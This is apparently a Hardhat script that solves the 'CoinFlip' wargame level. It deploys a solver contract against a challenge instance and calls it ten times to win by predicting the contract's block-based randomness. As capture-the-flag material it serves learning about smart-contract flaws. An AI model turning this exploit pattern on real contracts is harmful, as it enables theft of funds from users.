const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const CoinFlip = await ethers.getContractFactory("CoinFlip");
    const CoinFlipSolver = await ethers.getContractFactory("CoinFlipSolver");

    coin_flip = CoinFlip.attach(instance_address);

    // Deploy the CoinFlipSolver contract
    console.log('Deploying the CoinFlipSolver contract');
    contract = await CoinFlipSolver.deploy(instance_address);
    await contract.deployed();

    // Guess correctly 10 times in a row
    for (let i = 0; i < 10; i++) {
      console.log(`Calling guessCoinFlip for the ${i + 1} time...`)
      tx = await contract.guessCoinFlip();

      console.log('Waiting for 10 confirmations...');
      await tx.wait(10);

      console.log(`Consecutive wins: ${await coin_flip.consecutiveWins()}`);

    }

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x34B0f1A0ea50A9995a7dbecfDcb6204a12aDc154';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
